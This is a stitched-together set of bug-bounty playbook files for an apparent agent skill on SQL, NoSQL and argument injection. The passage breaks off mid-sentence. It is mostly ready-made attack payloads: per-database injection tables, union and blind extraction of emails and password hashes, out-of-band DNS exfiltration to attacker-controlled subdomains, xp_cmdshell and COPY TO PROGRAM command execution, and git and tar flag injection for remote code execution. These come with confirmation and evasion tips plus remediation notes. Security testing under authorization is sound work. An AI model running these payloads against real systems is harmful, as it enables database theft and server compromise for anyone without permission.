# sqli-nosqli — part 1/2 (52 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] SQLi hand-off when V-14 step 5 shows a query-shaped kid lookup:

sqlmap -u '<TARGET_URL>/api/lookup?kid=<VALUE>' --batch --delay=1 --safe-thresh=5
```

All invocations are templates: replace `<...>` slots, keep `-rate`/`--delay` at or below
1/s, and stop when proof is obtained.

---

## [Bugbountyskills.md] V-07: Command injection via argument injection in Unix wrapper utilities

**Mechanism:** The app passes user input as a separate **argv element** to a
fixed binary (`git`, `tar`, `convert`, `ffmpeg`, `curl`, `openssl`,
`pdftotext`, `find`) with no shell involved. Shell metacharacters do
nothing — but flag injection does: a leading `-` becomes a *option* that
changes the binary's behavior (`--output`, `-o <path>`, `--upload-file`,
`--upload-pack=`, `--checkpoint-action=exec`) yielding arbitrary file
read/write, SSRF, or RCE. The tell: no `--` separator before user args.

**Preconditions:**
- Input becomes a distinct argv entry (subprocess with arg list — NOT shell)
- Binary has dangerous flags AND the app doesn't reject values starting with `-`
- No `--` end-of-options marker before user-controlled args (the missing
  separator is the whole bug)

**Detect:**
1. Identify wrapper binaries: error/version strings naming the tool,
   features like "convert image", "fetch git URL", "compress archive",
   `ps`-leak notes, docs pages.
2. Safe observable flag-flip: inject a benign supported flag whose effect
   shows in the response — `--help`-style outputs, unit/format flags
   (`--output-format=json` → response becomes JSON, `--width=1` → resized
   dimensions, `-v` → verbose/version banner). A *format change caused by
   your dash-value* is argument-injection proof with zero damage.
3. Per-binary dangerous flags (lab depth; cite as potential in prod):
   `git` `-c core.sshCommand=`/`--upload-pack=` (RCE), `tar`
   `--checkpoint-action=exec=` (RCE), `curl` URL-position `file://`,
   `find -exec`, `ffmpeg` `concat:` (file read), `imagemagick` `msl:`/
   `https:` delegates (SSRF/file read), `openssl` `-out <path>` (file write).
4. Evasion notes: try both `--opt value` and `--opt=value`; long vs short
   (`--output`/`-o`); unicode dashes (U+2013/U+2015) rarely pass validation
   but cost one attempt; URL-encoding the dash if a pre-filter strips `-`.
5. Distinguish from V-01: if metachar payloads also work, a wrapper *script*
   re-invokes a shell — you have both variants; report the shell one first.

**Proof of concept:**
```
GET /api/convert?file=<PLACEHOLDER_FILE>&opts=<PLACEHOLDER_OPT> HTTP/1.1

benign flip:  opts=--output-format=json          → response format changes
read (lab):   opts=--output /tmp/marker          → path-controlled output
per binary:   git: -c core.sshCommand=<CMD>      → RCE — LAB ONLY
```

**Confirm:** A benign flag's observable effect traceable to your dash-value
(format/size/banner change), repeatable, **plus** one read-only effect where
the tool supports it safely (e.g., `file://`-class read of `/etc/hostname`).
Dangerous-flag chains: prove only in lab containers, describe in prod.

**False positives:** Input echoed in output or visible in `ps` (that's info
disclosure, not injection). Shell-style metachar payloads "working" because
a wrapper shell exists (V-01). WAF/validator rejecting `-`-prefixed values —
a block page is not evidence of anything working. Verbose flags the app
enables for everyone regardless of input.

**Impact:** Arbitrary file read/write via output-path flags, SSRF via
protocol flags, and RCE on binaries with exec-flavored options — report the
specific binary + flag + reachable filesystem scope; severity follows
whether the primitive was proven or cited.

**Remediation:** Insert `--` before user args, allowlist each param's value
grammar (charset, not just shape), invoke binaries with fixed arg arrays at
least privilege, and disable dangerous features at build/config time
(ImageMagick policy, git protocol restrictions).

**CWE / OWASP:** CWE-88 (Argument Injection) with CWE-77 where shell is
involved; OWASP A03:2021 Injection.

## [Bugbountyskills.md] >> sqli-testing — SKILL.md

*Source: `/root/Myskill/sqli-testing/SKILL.md`*

## [Bugbountyskills.md] sqli-testing: SQLi & NoSQLi Deep Playbook

## [Bugbountyskills.md] <DBMS> SQL injection in <parameter> leaks <data class> via <variant>

**Severity:** <High/Critical — CVSS vector if the program wants it>
**Endpoint:** `https://<target.example>/<path>` (POST/GET, auth: <cookie/token>)
**Summary:** The `<parameter>` parameter is concatenated into a `<query shape>`
query without parameterization. A `<variant>` payload produces <observable>,
confirming <oracle type>. Proven with read-only extraction of <what you got>.

## [Bugbountyskills.md] >> sqli-testing — payloads.md (request templates, tool commands, evasion)

*Source: `/root/Myskill/sqli-testing/references/payloads.md`*

## [Bugbountyskills.md] sqli-testing — Payloads, Templates & Tool Invocations (references/payloads.md)

Cross-cutting material for `SKILL.md` and both variant files. Everything here is a
**template**: `<PLACEHOLDER>` slots only, never hardcoded live targets. Keep proofs
read-only — no `DROP`/`DELETE`/`UPDATE`/`INSERT`, no heavy/DoS payloads, against
third-party targets (see `SKILL.md` §1).

### [Bugbountyskills.md] MySQL / MariaDB

| Purpose | Template |
|---|---|
| Quote probe | `<BASE>'` / `<BASE>\` |
| Error engine (schema) | `<BASE>' AND EXTRACTVALUE(1,CONCAT(0x7e,(<SUB>)))-- ` |
| Error alt | `<BASE>' AND UPDATEXML(1,CONCAT(0x7e,(<SUB>)),1)-- ` |
| Union (column count found) | `<BASE>' UNION ALL SELECT <NULLS-with-<index>=<expr>-- ` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Time | `<BASE>' AND IF((<COND>),SLEEP(<N>),0)-- ` |
| String→hex (quoteless) | `<SUB>` as `0x<hex>` / `CHAR(97,98,99)` |
| File read (priv check first) | `<BASE>' AND LOAD_FILE('<FILE>')-- ` |
| Stacked | `<BASE>'; SELECT <READ-ONLY-EXPR>-- ` |

Schema: `information_schema.tables/columns`, `database()`, `version()`, `current_user()`.

### [Bugbountyskills.md] PostgreSQL

| Purpose | Template |
|---|---|
| Error engine | `<BASE>' AND 1=CAST((<SUB>) AS INT)-- ` |
| Error alt (div-zero) | `<BASE>' AND 1/(CASE WHEN <COND> THEN 0 ELSE 1 END)-- ` (or `||` literal-cast) |
| Union | `<BASE>' UNION ALL SELECT <NULLS>,<expr>-- ` |
| Boolean | `<BASE>') AND (<COND>)-- ` (adjust to paren depth of real query) |
| Time | `<BASE>'; SELECT CASE WHEN (<COND>) THEN pg_sleep(<N>) ELSE pg_sleep(0) END-- ` |
| Concat/string | `chr(97)||chr(98)`, `substr((<SUB>),<off>,1)`, `ascii(...)` |
| Stacked (native) | `<BASE>; SELECT <READ-ONLY-EXPR>-- ` |
| RCE-ish (superuser, lab) | `; COPY (SELECT 1) TO PROGRAM 'id'` → **see V-10 + `rce-testing`** |

Schema: `pg_catalog.pg_tables`, `information_schema.columns`, `current_database()`, `version()`.

### [Bugbountyskills.md] MSSQL

| Purpose | Template |
|---|---|
| Quote probe | `<BASE>'` (error: `Unclosed quotation mark`) |
| Error engine | `<BASE>' AND 1=CONVERT(INT,(<SUB>))-- ` |
| Union | `<BASE>' UNION ALL SELECT <NULLS>,<expr>-- ` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Time | `<BASE>'; IF (<COND>) WAITFOR DELAY '0:0:<N>'-- ` |
| String | `SUBSTRING((<SUB>),<off>,1)`, `ASCII(...)`, `+` concat, `TOP <n>` |
| Stacked | `<BASE>'; SELECT <READ-ONLY-EXPR> ;--` |
| OOB / shell | `'; EXEC master..xp_cmdshell 'whoami'-- ` → **V-10 + `rce-testing`** |

Schema: `sys.objects`, `sys.columns`, `sys.databases`, `@@version`, `IS_SRVROLEMEMBER('sysadmin')`.

### [Bugbountyskills.md] SQLite

| Purpose | Template |
|---|---|
| Error probe | `<BASE>'` → `near "...": syntax error` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Union | `<BASE>' UNION SELECT <NULLS>,<expr>-- ` |
| Time | no native sleep — use boolean only (or `LIKE`/`randomblob` heavy ops **avoid on prod** — DoS guardrail) |
| Schema | `sqlite_master` (`name`, `sql`), `sqlite_temp_master` |
| File/attach (lab) | `'; ATTACH DATABASE '/tmp/<x>.db' AS p;-- ` → V-10 |

### [Bugbountyskills.md] NoSQL (MongoDB-shaped) — see V-13

- `{"user":"<BASE>","pass":{"$ne":""}}` · `{"pass":{"$regex":"^<CHAR>"}}` · `{"id":{"$gt":0}}`
- Form-param: `user=<BASE>&pass[$ne]=` · `?id[$regex]=^<CHAR>` · `$where` → `rce-testing` note.

---

## [Bugbountyskills.md] 7. Time-based confirmation: differential timing, not fixed sleeps

A payload that "took 3 seconds" proves nothing — the target may just be slow.
Confirm with **differential timing**: identical-shaped requests where only the
condition's *truth* changes.

**Method:**
1. **Baseline distribution:** 5+ requests of the *unmodified* request → mean `μ₀`, range. No baseline, no test.
2. **Matched pair, same shape:** `TRUE = ' AND IF((1=1),SLEEP(<N>),0)-- '` vs `FALSE = ' AND IF((1=2),SLEEP(<N>),0)-- '`. Same length, same tokens, only the condition differs. *(Engine swap: PG `CASE WHEN ... THEN pg_sleep(<N>) ELSE pg_sleep(0) END`; MSSQL `IF (1=1) WAITFOR DELAY '0:0:<N>'` vs `IF (1=2)...`; Oracle `DBMS_PIPE.RECEIVE_MESSAGE('x',<N>)` gated in `CASE`.)*
3. **≥3 samples each, interleaved** (T,F,T,F,... to cancel drift). Record raw seconds.
4. **Pass criteria:** `min(TRUE samples) > max(FALSE samples) + <N>×0.6` (e.g. sleeps of 3s: TRUE ≥ 3.0s, FALSE ≤ baseline+noise), *and* FALSE ≈ `μ₀`. Non-overlapping clusters = signal; overlapping = not confirmed.
5. **Condition carries data:** swap `1=1` for `ASCII(SUBSTR((<SUB>),1,1))=<code>` — the delay must *move* with the comparison. That is the extraction oracle (V-04/V-15).
6. **FP checks (do these before reporting):**
   - *Shape-delay:* WAF/scanner latency inflates **both** branches — that's why the pair must be same-shaped; if both delay ~equally, the DB isn't sleeping.
   - *Cache:* add cache-busting or use POST; a cached TRUE hides the effect.
   - *Per-row multiplication:* `SLEEP` in a `WHERE` over N rows → delay ≈ N×`<N>` — normalize (target `LIMIT 1`/`HAVING`-single-row contexts) or note N.
   - *Timeout cap:* if the app or proxy times out at `<N>`+ε, lower `<N>` to 1-2s; don't treat "both slow" as pass.
   - *Random jitter:* 1 sample never passes; only distributions pass.
7. **Evidence for the report:** the timing table (sample → seconds per branch), parameters, and the boolean/OOB second signal (§1 rung 3).

**Do NOT:** loop `SLEEP` in scripts against third-party targets, stack hundreds of
delay probes, or use heavy-query timing (`REPEAT`, big joins) as the sleep — those
are DoS-shaped and violate `SKILL.md` §1. Pace: a few paired probes, then stop.

---

## [Bugbountyskills.md] >> sqli-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/sqli-testing/references/variants-1.md`*

## [Bugbountyskills.md] sqli-testing — Variants 1-8 (references/variants-1.md)

Deep playbook for the exfiltration matrix, first half. Read §4 of `SKILL.md` for the
verification standard before claiming any of these as findings. Payload templates,
encoders, and tool flags live in `payloads.md`. Never run destructive or DoS-shaped
payloads against third-party targets — prove impact with read-only extraction or an
oracle.

## [Bugbountyskills.md] V-01: Database schema extraction via error-based SQL injection engines

**Mechanism:** The database itself renders query results inside its error message, so
a failing subquery still echoes data. The injector abuses functions that throw the
value verbatim: MySQL `EXTRACTVALUE`/`UPDATEXML`, Postgres `CAST(... AS int)` or
`1/0` + `|` literals, Oracle `CTXSYS.DRITHSX.SN` / `UTL_INADDR`, MSSQL conversion
errors. The violated assumption: "errors are never shown to users" — but the DBMS
error string is interpolated into the framework's error page.

**Preconditions:**
- Error messages (or an error oracle like status 500 with differing bodies) reach the client; verbose mode, stack traces, or a debug page enabled.
- Injected value flows into an expression the DBMS evaluates eagerly (not a prepared-statement placeholder).
- DBMS fingerprinted (from the error text) so the right function is used.

**Detect:**
1. Send a single `'` and a double `"` — capture raw bodies. MySQL → `You have an error in your SQL syntax`; MSSQL → `Unclosed quotation mark` / `ODBC`; Postgres → `unterminated string` at/` syntax error; Oracle → `ORA-01756` / `ORA-00933`; SQLite → `near "...": syntax error`. Fingerprint first, always.
2. Probe an arithmetic oracle: inject `' AND 1=CAST((SELECT 1) AS INT)-- ` (Postgres/MSSQL) or `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))` (MySQL). A *different* error than the baseline syntax error means you are in an evaluated context.
3. Confirm the engine reflects expressions: try `' AND 1=CAST('123abc' AS INT)-- ` — error should mention `123abc`.
4. Escalate one level: replace `123abc` with a subquery over `information_schema.tables` (MySQL/MSSQL), `pg_catalog.pg_tables` (Postgres), `all_tables` (Oracle), `sqlite_master` (SQLite).

**Proof of concept:**
- MySQL: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- `
- Postgres: `' AND 1=CAST((SELECT tablename FROM pg_catalog.pg_tables LIMIT 1) AS INT)-- `
- Oracle: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))-- `
- MSSQL: `' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.objects))-- `
- SQLite: `' AND load_extension(1)-- ` or `AND CAST(sql AS INT)` against `sqlite_master`.

**Confirm:** Errors render *only* when the subquery result fits the error-message
format — run the same payload with a known-false condition (e.g. `WHERE 1=0`) and
watch the error disappear. That differential proves the error is query-driven, not a
static error page. Cross-check with a boolean flip (V-03) on the same parameter.

**False positives:** Generic framework 500s on any malformed input; WAF block pages
that echo part of the payload; verbose errors from a *different* layer (JSON parser)
that coincidentally contain your string; `EXTRACTVALUE` errors that fire from
XPath-literal parsing rather than your subquery. Juniors also misattribute — an
error page quoting the URL back does not mean SQL echoed your data. Check the
reflected fragment actually comes from the DBMS (engine-specific error code in it).

**Impact:** Unauthenticated or low-priv attacker enumerates table/column names, then
row data, directly from error messages — one request per chunk (errors truncate
~32 chars, so `MID`/`SUBSTRING` in 32-byte windows). Reportable as full schema + data
extraction; note auth level and rate (no special tooling needed to weaponize).

**Remediation:** Parameterized queries (never string-built SQL) plus generic error
handling — return a correlation ID to the user, log the full DB error server-side.

**CWE / OWASP:** CWE-89, CWE-209 (Information Exposure Through an Error Message) — OWASP A03:2021; WSTG-ERR-01 + WSTG-INP-04.

---

## [Bugbountyskills.md] V-02: Cross-table arbitrary data retrieval via union-based SQL injection compilation

**Mechanism:** The attacker appends a `UNION SELECT` whose column count and types
match the original SELECT, so the DBMS returns attacker-chosen rows in the legitimate
result channel (a product list, a profile page). The violated assumption: the result
set's shape is fixed by the application's own query — but a string-concatenated
`WHERE` lets the attacker add a whole second query result.

**Preconditions:**
- Injected input is inside a `SELECT`-shaped query (search, listing, report) — not a write or a `WHERE`-only lookup against a single expected row.
- The query result is rendered to the response (multiple rows visible: list pages, exports).
- No strict prepared-statement placeholder for the injected slot; attacker can add operators (`ORDER BY`-style probing works here too).
- Column count/type must be discoverable — a smaller obstacle than most people think.

**Detect:**
1. Baseline: capture the normal response for a benign input (row count, layout).
2. Find column count with `ORDER BY n` (V-09): increment n until the error/blank page — n-1 is the column count. (Union can use the same trick: `' ORDER BY 10-- ` → error.)
3. Locate a string-displayable column: `' UNION SELECT 1,2,3-- ` → which number appears in the rendered field?
4. Null-fill the rest if types conflict: `' UNION SELECT 1,NULL,3-- ` — if columns are typed (Oracle requires exact types), cast: `' UNION SELECT 'a','b','c' FROM dual-- `.
5. Confirm the union channel with a constant: replace the found index with `'pwned'||version()-- ` or `@@version`.

**Proof of concept:**
- Generic: `<BASELINE>' UNION ALL SELECT NULL,<index>,NULL FROM <table> WHERE '<x>'='<x>`
- MySQL, extract emails via the found display column:
  `' UNION ALL SELECT NULL,email,NULL FROM users WHERE '1'='1`
- Bypass login-style `WHERE` (pair with V-03 for a real login test on your own account):
  `' UNION SELECT 1,'admin','x'-- ` against `SELECT id,role,pw FROM accounts WHERE name='<in>'`.
- Cross-table pivot (the "cross-table" part): `' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_schema=database()-- `.

**Confirm:** The union row appears where the application's own rows would appear,
*and* disappears when the union is made false (`AND 1=2`). Two signals: presence
toggle + a value only your query can produce (e.g. `version()` string not present
anywhere else in the app).

**False positives:** The "leaked" value already exists on the page (search echo);
numeric indices rendering as normal row data from an unrelated feature; WAF/CDN
normalizing `UNION` so what you saw was the baseline; counting columns with `ORDER
BY` but the error coming from a WAF, giving the wrong count; multi-row pagination
hiding your injected row (check page 2, change `LIMIT`). Also: `UNION` needs the
same column count *of the outermost SELECT* — subqueries inside one column don't add
columns; juniors over-count here.

**Impact:** Direct, tool-friendly exfiltration: any table reachable by the DB user,
one request per row (batch with `GROUP_CONCAT`/`string_agg`/`LISTAGG` to speed it).
State auth level and whether it's unauthenticated (drives severity to high/critical).

**Remediation:** Parameterized statements for every interpolated slot; deny `UNION`
by construction (placeholders make appended SQL literal data, not syntax).

**CWE / OWASP:** CWE-89 — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] V-03: Inferential data exfiltration via boolean-based blind SQL inferences

**Mechanism:** The query's *outcome* (true vs false) is observable — content, length,
HTTP status, redirect, "no results" banner — even though no data is ever returned
directly. The attacker turns the page into a 1-bit oracle and extracts strings one
condition at a time: `AND SUBSTRING((SELECT ...),n,1)='a'`. The violated assumption:
"hiding errors and returning generic pages prevents extraction" — inference needs
only a stable difference between true and false.

**Preconditions:**
- A boolean context exists: attacker condition can be combined with the original `WHERE`/`HAVING` (`AND 1=1` fits inside the query).
- The response differs *reliably* between true and false (row count, message, length) — and the difference is not randomized (nonce, CSRF, timestamp, ad slot).
- Auth/session state stable across many requests (blind extraction is chatty: budget requests, be polite).

**Detect:**
1. Differential probe: send `' AND 1=1-- ` and `' AND 1=2-- ` (and the unquoted int version `AND 1=1` / `AND 1=2` if numeric context). Compare status, length, and visible content.
2. Control for noise: repeat each 3-5×. A real oracle is deterministic; if lengths jitter ±N for both, subtract the noise by comparing *content* (row presence) instead.
3. Sanity-check the condition is yours: `' AND 'a'='a` vs `' AND 'a'='b` should flip the same way. Then `' AND (SELECT 1 FROM dual)=1`-style engine-appropriate dual check.
4. Move to data: `' AND SUBSTR((SELECT user FROM session LIMIT 1),1,1)='a'-- ` and binary-search the charset.
5. Control query: always run the negated form — if true-flip and false-flip both "succeed", the page is lying (see False positives).

**Proof of concept:**
- Truth flip (probe): `' AND 1=1-- ` vs `' AND 1=2-- `
- String extraction window: `AND ASCII(SUBSTR(<subquery>,<offset>,1))><mid>` (binary search: ~7 requests/char for a 95-char ASCII range)
- Time-free version on a paginated listing: `' AND (SELECT LENGTH(email) FROM users WHERE id=1)>5-- ` → row present vs "0 results".
- Hidden-parameter abuse: only exploit rows you own (`WHERE id=<your-session's-row>`) when proving impact.

**Confirm:** Two independent confirmations: (a) the same 1-bit flip reproduces 3/3
times with a *different* payload family (operator change: `>` → `LIKE 'a%'`), and
(b) the extracted value matches ground truth you already know (your own password's
first char, a value shown elsewhere in the UI). Ground-truth match kills FP reports.

**False positives:** Dynamic page length from anti-CSRF tokens, timestamps, random
ad/banner content, rate-limit counters; caching that returns one cached variant;
WAF "safe" pages that differ per payload shape (not per condition truth); `ORDER BY`
index changing row *order* but not presence — testers misread ordering as a boolean
signal; and `AND 1=1` "working" because it simply doesn't break a tolerant parser.
The classic: comparing `' AND 1=1` against the *uninjected* baseline instead of
against `' AND 1=2`. Always compare the pair, never baseline vs payload. And on
server-rendered pages (Next.js/RSC, any ad- or token-bearing SSR), *identical* requests
routinely differ by ~1 KB — a single pair means nothing. Run each pair 2-3 times and
require a stable, repeating differential; "sizes differ by 18 bytes" is noise until it
reproduces (real signal from a 2026-10 engagement: 7 probes, all within baseline variance,
zero DB error strings → correctly ruled out).

**Impact:** Slow but total: every column readable one bit at a time; report request
counts (~7×length per string) so triage sees the practical data-rate; mention
unauthenticated vs authenticated.

**Remediation:** Parameterized queries; if dynamic filtering is unavoidable, bind
values and keep attacker conditions out of the SQL string entirely.

**CWE / OWASP:** CWE-89 — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] V-04: Asynchronous database delay evaluation via time-based blind SQLi conditions

**Mechanism:** The attacker forces the database to *pause* conditionally, using the
response latency as the oracle — `SLEEP(n)` (MySQL/MariaDB), `WAITFOR DELAY`
(MSSQL), `pg_sleep(n)` (Postgres), `DBMS_PIPE.RECEIVE_MESSAGE` (Oracle),
`randomblob`/recursive CTE for SQLite. Works even when the response body is
identical, errors are suppressed, and no row is rendered: time is the channel.

**Preconditions:**
- Injected condition reaches a query that runs *synchronously* in the request path (async jobs, cached reads, and CDN-fronted GETs break the oracle).
- The DBMS supports a delay primitive reachable from the injected context (`IF`/`CASE` wrappers for conditional delay).
- Network baseline measurable: known jitter, load balancer variance, and server-side timeouts matter.

**Detect:**
1. Measure baseline: 5 requests, record mean and stddev of total time for the *unmodified* request. You need a stable baseline (e.g. 120ms ±15) before anything.
2. Unconditional delay: MySQL `/' OR SLEEP(3)-- ` (in `WHERE` context), Postgres `'; SELECT pg_sleep(3)-- `, MSSQL `'; WAITFOR DELAY '0:0:3'-- `, Oracle `'+UTL_INADDR... ` or `CASE WHEN ... THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) END`.
3. **Differential confirmation, not fixed sleeps:** send `AND IF(1=1,SLEEP(3),0)` and `AND IF(1=2,SLEEP(3),0)`. Only the true branch may delay. A payload that delays both ways is useless (server-side parse cost, WAF, or unconditional sleep).
4. Repeat each branch ≥3× and compare distributions, not single samples. Confirm when true-branch mean ≫ false-branch mean with non-overlapping ranges (e.g. true 3.0-3.4s vs false 0.1-0.2s).
5. Prove conditionality of the *data*: `AND IF(ASCII(SUBSTR((SELECT ...),1,1))>64,SLEEP(3),0)` — flip the comparison and watch the delay move.

**Proof of concept:**
- MySQL conditional: `' AND IF(ASCII(SUBSTR(<subquery>,<offset>,1))=<code>,SLEEP(3),0)-- `
- Postgres: `'; SELECT CASE WHEN (ASCII(SUBSTR((SELECT current_user),1,1))=97) THEN pg_sleep(3) ELSE pg_sleep(0) END-- `
- MSSQL: `'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))=97) WAITFOR DELAY '0:0:3'-- `
- Oracle: `' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 0 END=1-- `
- Keep delays 1-3s; never loop sleeps in a script against third-party targets (that's a self-inflicted DoS).

**Confirm:** Differential timing (V-04's own rule): true branch delayed, false branch
not, 3/3 runs, plus a second signal — combine with a boolean body difference where
available, or reproduce with a different delay primitive (`pg_sleep` → `|| '...'`
heavy-query timing only as a last resort and only if read-cheap). Report the timing
table (samples, means) as evidence.

**False positives:** Network variance and target load (never trust one sample);
server-side statement timeouts that cap long sleeps so true/false both look equal;
CDN or WAF delaying *based on payload shape* (this is the killer — a WAF scanning
`SLEEP(3)` takes time regardless of condition, so both branches delay → your
differential must compare true vs false of the *same shaped* payload);
connection-pool saturation adding seconds at random; `SLEEP` in a query that runs
per-row multiplying delay — that's real but makes the oracle crude (normalize by
row count or target `LIMIT 1` contexts). Juniors also accept "it felt slow".

**Impact:** Full blind extraction without content: same data-rate math as V-03 plus
the ability to work where *only* timing survives (API-only, no error page, no
rendered rows). Mention request volume and sleep duration — triage needs to know
you didn't hammer their server.

**Remediation:** Parameterized queries (delay lives in code, not in attacker SQL);
keep WAFs from being the only control; monitor for repeated conditional-latency
patterns as detection.

**CWE / OWASP:** CWE-89 (+ CWE-400 consideration if delays were abused) — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] V-05: Out-of-band data exfiltration via DNS logging protocols (OOB SQLi / DNSlog frameworks)

**Mechanism:** The DBMS resolves or fetches an attacker-controlled domain during
query evaluation, turning the network stack into a side channel that carries *data*
(not just a bit): `LOAD_FILE(CONCAT('\\\\',<value>,'.<your-id>.dnslog.cn\\x'))`
(MySQL), `utl_http.request` (Oracle), `xp_dirtree`/`OPENROWSET` (MSSQL),
`dblink`/`COPY`-adjacent resolution (Postgres via `http` ext or
`CITEXT`-style crafted hosts), SQLite `load_extension` over UNC. DNS labels can
encode extracted bytes — one request can exfiltrate a whole string chunk. The
assumption violated: "the DB can't talk to the internet."

**Preconditions:**
- Outbound DNS (or HTTP) from the DB server to the internet — many hardened prod DBs block this; check early, don't assume.
- A logging collaborator: Burp Collaborator, interactsh, OASTify, DNSlog.cn, custom subdomain of your VPS. Use a *per-test unique* subdomain.
- Privileges: MySQL `FILE` for `LOAD_FILE`; MSSQL `xp_dirtree` reachable; Oracle network packages enabled.

**Detect:**
1. Establish the channel first with a *constant* payload: `' AND LOAD_FILE(CONCAT('\\\\','oast-test-<nonce>.yourdomain.com\\a'))-- ` — no data, just proves egress. Confirm a DNS query at your logger *before* trying data.
2. If no callback: the DB likely has no egress (or `secure_file_priv`/`local_infile` blocks). Fall back to V-03/V-04 — do not keep re-firing.
3. Once constants callback, test data-carrying: point the host at `version()` output encoded in labels (hex → valid label chars `0-9a-f`).
4. Verify determinism: same payload twice → two identical queries at the logger; altered condition → no query (conditional OOB).
5. Record request→callback pairing (timestamp correlation) as evidence.

**Proof of concept:**
- MySQL DNS exfil: `' AND IF(SUBSTR(<subquery>,1,1)='a',LOAD_FILE(CONCAT('\\\\',HEX(SUBSTR(<subquery>,1,8)),'.<nonce>.yourdomain.com\\x')),0)-- `
- MSSQL: `'; DECLARE @d NVARCHAR(255); SET @d=(SELECT TOP 1 name FROM sys.tables); EXEC('master..xp_dirtree \\\\'+@d+'.<nonce>.yourdomain.com\\a')-- `
- Oracle: `' AND UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.<nonce>.yourdomain.com/') IS NOT NULL-- ` (or `DBMS_LDAP` / external tables).
- Postgres: `COPY`-free variant using `dblink`/`http` extension where present; otherwise use timing (V-04).
- HTTP OOB (when DNS-only is unavailable): blind SSRF-flavored callback to your HTTP logger — chain notes in `payloads.md` §6.

**Confirm:** Callback arrives at *your* logger with your nonce, tied to a request you
sent (timestamp + unique subdomain per payload), and stops when the condition is
false. One callback proves OOB channel; data carried in labels matching ground
truth (your own username) proves *exfiltration*.

**False positives:** Your own earlier probe's DNS still resolving (caching — always
use fresh nonces); scanners/bots that resolve any subdomain you mention (interactsh
distinguishes your request correlation, use it); wildcard DNS on your domain
answering everything (verify with a random label that never appears in a payload);
callback from the *client's* browser (e.g. if payload reflects into an `<img>` —
check the query source IP is the *server's*, not yours); and assuming "callback seen
= data extracted" when it was the constant probe. 

**Impact:** Covert, chunked exfiltration that bypasses response-side controls —
useful when the app filters output but not DB-side resolution; report egress
capability + auth level; explicitly note no destructive commands were run.

**Remediation:** Parameterize; egress-filter DB servers; disable `FILE`/network
packages for the app's DB role; alert on DNS queries to non-allowlisted domains from
DB hosts.

**CWE / OWASP:** CWE-89, CWE-918 adjacency (SSRF-like DB egress) — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] V-07: Downstream persistence exploitation via second-order SQL injection pipelines

**Mechanism:** Input stored verbatim at write time (no injection possible yet —
`INSERT` used a placeholder), then *re-used inside a string-built query later* —
when an admin views the list, a report runs, a search executes, or a login checks
credentials. The injection is deferred: the attacker plants SQL as *data* in a
trusted field, and the application's own later query promotes it to syntax. The
violated assumption: "we parameterized the INSERT, so we're safe" — the SELECT that
consumes the field forgot to.

**Preconditions:**
- A write path stores attacker text unchanged (profile, ticket title, address, referral code, filename, webhook name).
- A read/action path later concatenates that stored value into SQL — find it by tracing where the field is displayed, filtered, sorted, or exported.
- The consuming query is attacker-influenced *indirectly* — timing is your friend: trigger the sink explicitly (visit the admin list, trigger the report) rather than waiting.

**Detect:**
1. Inventory stored fields: register/update flows with text inputs (name, bio, company, tag). Plant a *safe marker* first: `sqli-test-'-<nonce>` — remember it.
2. Search the app for where that marker is re-used: pages that display it, exports, "similar users" search, notifications, admin views, sorting by that column, or API responses that include a derived filter.
3. Watch for the planted quote to *break* the consumer: a 500, a missing row, a truncated display — that's the classic second-order symptom ("my name broke the admin page").
4. Escalate with a boolean in the stored field: name = `' AND '1'='1` vs `' AND '1'='2` — then observe whether the consuming page's row set changes when *it* runs.
5. Time-based variant (when the consumer is hard to see): store `' AND SLEEP(3)-- ` in a candidate field, then trigger the consumer; delay on trigger = confirmed pipeline.

**Proof of concept:**
- Plant (write, benign): `PUT /api/profile {"displayName": "bob'||'"} ` — wait, plant full payload:
  `{"displayName": "' OR '1'='1"-- "}` (stored via parameterized INSERT).
- Trigger: `GET /admin/users/list` (or any consumer) → consumer builds
  `SELECT * FROM users WHERE display_name='<stored>'` → injection fires.
- Data extraction via plant: store
  `' UNION SELECT email,password_hash FROM users WHERE '1'='1` in the field the consumer renders, then trigger and read the consumer's output.
- Time variant: store `x' AND IF(ASCII(SUBSTR((SELECT ...),1,1))=97,SLEEP(2),0)-- ` then trigger; measure on trigger (differential — see V-04).

**Confirm:** Two-stage reproduction: (1) same stored payload triggered from the
consumer endpoint 3/3 times yields the effect, (2) changing *only* the stored value
(changes the condition truth) changes the consumer's behavior — the effect tracks
the *data*, not the write request. That temporal separation is the second signal.

**False positives:** Reflected injection masquerading as second-order (payload
echoed *directly* by the write response — test by triggering the consumer from a
*different* session/page); self-inflicted XSS instead of SQLi (script tag in your
name breaks the admin page — check the breakage is SQL-shaped: engine error, row
count change); stored XSS being reported as injection; input-length truncation
choking your payload so the "second-order" never actually contained SQL (V-14
interference); and consumers that *sanitize on display* producing false negatives.
Junior trap: triggering from the same session you wrote in can hit a cache — use a
fresh session for the consumer.

**Impact:** Often higher severity than first-order: the injection lands in
privileged/admin contexts (the consumer is usually an admin dashboard or nightly
report run with a high-priv DB role), fires without the attacker's session, and can
corrupt *other users'* views. Report the full write→store→trigger chain with both
request/response pairs.

**Remediation:** Parameterize the *consuming* query too — every re-use of stored
data needs its own binding; treat stored strings as untrusted forever, not just at
insert time.

**CWE / OWASP:** CWE-89 (second-order variant; often called "stored SQL injection") — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] V-08: Transport-layer bypasses via JSON, XML and GraphQL embedded parametric SQLi

**Mechanism:** The injectable value is wrapped in a structured transport — JSON body
